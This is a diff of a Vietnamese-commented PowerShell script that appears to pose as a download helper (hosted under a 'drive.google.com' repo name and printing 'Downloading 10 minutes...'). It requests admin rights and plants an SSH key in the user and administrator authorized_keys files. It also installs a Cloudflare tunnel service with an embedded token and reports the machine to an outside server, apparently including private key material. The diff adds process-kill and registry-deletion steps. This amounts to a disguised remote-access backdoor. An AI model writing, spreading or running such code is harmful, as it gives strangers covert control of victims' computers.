@@ -6,7 +6,7 @@ Write-Host 'Downloading 10 minutes...' -ForegroundColor Green
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
-$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini6.ps1'
+$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini7.ps1'
 
 # ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
 $CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
@@ -31,7 +31,7 @@ if (-not $__admin) {
   }
   try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
   
-  # FIX LỖI TẮT TAB: Dùng -File thay vì iex để tránh lỗi parse
+  # Dùng -File để giữ tab Admin không bị tắt
   $__arg = "-NoExit -NoProfile -ExecutionPolicy Bypass -File `"$__src`""
   
   Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
@@ -62,7 +62,7 @@ for ($w = 0; $w -lt 30; $w++) {
 }
 
 # ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
-# FIX LỖI 404: Đã xóa dấu \ thừa trước biến $mgmtDir
+# Đã xóa dấu \ bị lỗi
 $mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
 New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
 $priv = Join-Path $mgmtDir 'mgmt_ed25519'
@@ -78,7 +78,6 @@ $privLine = (Get-Content $priv -Raw).Trim()
 $userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
 $adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
 foreach ($f in @($userKeyFile, $adminKeyFile)) {
-  # FIX: Tao thu muc .ssh neu chua co
   New-Item -ItemType Directory -Force -Path (Split-Path $f -Parent) | Out-Null
   $lines = @(); if (Test-Path $f) { $lines = @(Get-Content $f) }
   if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
@@ -94,7 +93,6 @@ $cfDir = Join-Path $env:ProgramData 'cloudflared'
 $cfExe = Join-Path $cfDir 'cloudflared.exe'
 New-Item -ItemType Directory -Force -Path $cfDir | Out-Null
 
-# FIX: Su dung if/else thay cho toan tu ternary (?) vi PowerShell 5.1 khong ho tro
 $cfArch = if ([Environment]::Is64BitOperatingSystem) { '64' } else { '32' }
 if ([Environment]::Is64BitOperatingSystem) {
   $cfUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
@@ -106,11 +104,24 @@ if (-not (Test-Path $cfExe)) {
   Invoke-WebRequest $cfUrl -OutFile $cfExe -UseBasicParsing
 }
 
-# Don service cu bang sc.exe (tranh loi stderr cua cloudflared)
+# =======================================================
+# FIX: TỰ ĐỘNG DỌN DẸP RÁC TRƯỚC KHI CÀI CLOUDFLARED
+# =======================================================
+Write-Host "  Don dep Cloudflared cu..." -ForegroundColor Gray
 $ErrorActionPreference = 'Continue'
-# FIX: Bo 2>&1 de tranh PowerShell 5.1 hieu nham stderr la loi
-$null = & sc.exe delete Cloudflared
-Start-Sleep -Seconds 2
+
+# 1. Diệt tiến trình đang chạy (nếu có)
+taskkill /F /IM cloudflared.exe | Out-Null
+
+# 2. Xóa service cũ (nếu có)
+sc.exe delete Cloudflared | Out-Null
+
+# 3. Xóa Registry key bị kẹt (Nguyên nhân gây lỗi Cannot install event logger)
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" /f | Out-Null
+
+# Đợi 3 giây để Windows giải phóng hoàn toàn
+Start-Sleep -Seconds 3
+# =======================================================
 
 # Cai service moi: bat stderr ra file de PowerShell khong coi la loi
 $errLog = Join-Path $env:TEMP 'cf_install.err'
@@ -126,8 +137,6 @@ if ($proc.ExitCode -ne 0) {
 Start-Service 'Cloudflared' -ErrorAction Stop
 
 # ===== 4. GUI LEN SERVER =====
-
-# FIX: Lam sach ten may de hop le voi DNS (thay _ bang -, viet thuong)
 $safeName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9-]','-').ToLower()
 $cfHostname = "$safeName.$YourDomain"
 
@@ -170,5 +179,5 @@ if (-not $primaryIP) {
 }
 
 # if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
-Write-Host "Error" -ForegroundColor Red
+Write-Host "HOAN TAT!" -ForegroundColor Green
 pause
